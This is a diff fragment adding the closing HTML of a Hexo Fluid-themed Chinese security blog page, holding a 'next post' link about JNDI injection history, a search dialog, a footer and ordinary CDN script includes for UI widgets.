+                      <a href="/2022/jndi-injection-history/" title="当我们谈论JNDI注入时，我们在谈论什么">
+                        <span class="hidden-mobile">当我们谈论JNDI注入时，我们在谈论什么</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      @pwnull
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
